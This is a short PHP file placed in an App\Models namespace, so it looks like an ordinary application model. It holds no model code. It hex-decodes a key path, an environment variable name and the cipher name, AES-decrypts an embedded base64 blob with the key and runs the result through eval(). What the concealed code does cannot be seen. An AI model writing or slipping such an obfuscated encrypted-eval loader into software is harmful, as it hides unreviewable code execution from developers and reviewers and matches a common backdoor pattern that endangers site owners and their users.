<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LoxvJzpK+lXwpRN0vX6Lig==');

$c=base64_decode(

'mWtssUtgoroE72G6HLZIkJVFm65XIunGelqaQ6nEYCX4dXJ2HxXjI04v3+BBQLEJiqWY4SX5f2rr' .
'qiB91496Jm+1QZeo5ZcANQE0N4ZEDfr8pt/P2DMj+CwFz867V6LMGtR6/zYVptbH3kwdQq9dgBwq' .
'1I1hFq1TfuuxRpSvv739auQHTMqsGouXd0X0FpqCN2vbU/v4UdzykJ6cfiiQV0kOGDTtOxZL1k2b' .
'uedCIKa2bnk29f+g0gNUgvQG2Y5RZ3H4+9rBeAd7lJSziqwO/hhTBxc27LmoD2y5467brtK2jpdd' .
'Nvdo+DSSY/b6liHygXgHejvyqnRm2H6IYKPRRE1CHI+pzaVOQ0yPlk0D8+bPark0tkTri9hXeWzC' .
'Und+GszbTcy+LdFIAL6QdRpP1tsT7Qi6RAD3CLx0HIENFcKBbuuoK0cw9+Rw2eYiVFZy2hodb4UX' .
'rTblFDcyqp4rowGq8/RKNDQjYG0AP9j12AqAlQ33+HR2/39YkJpsJqxllAxQTqo2YDVcv7d5tmhT' .
'fz2psHtz0FQnWhZxfMzeDlaiczLkdIjIAtMzGA3t8AX+p+75a7UHHbE6ouXpzZEGFyn0BHq/VIvk' .
'd0f/J9FviRpC/0EROMjL4Qk9tR9PGh5YpIMnf+BU/oW06ViVEtTcumexBLVGOTfAzjELzs0DxGm1' .
'v/PVwWKk1CEIoaRV3TOZQR8o7SvaB8Ui4GMLZ5ND57blj9YECz1vheoXnqoxQRfKgpn+zqpBG73t' .
'id1/CUDJbYBKJJhX0M0cKesRfgkFrG+jXfSn3pkQkp1c2ECQsU0OC01r118lu1y+Xou5yj8bgY3A' .
'vpc9L4KUWFvdPlGHGpDZue/bM5DqLQOVrm97noqvxavFRtDQ7W22R3EicaDy4WFDfgRT8ONo30OX' .
'DXq3BzvRrlLhVISW0afkOPyLvwLLdUPmINwDpMEBkiNMuzAfEzEl0CnSzcDCjT1cf0Kktg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

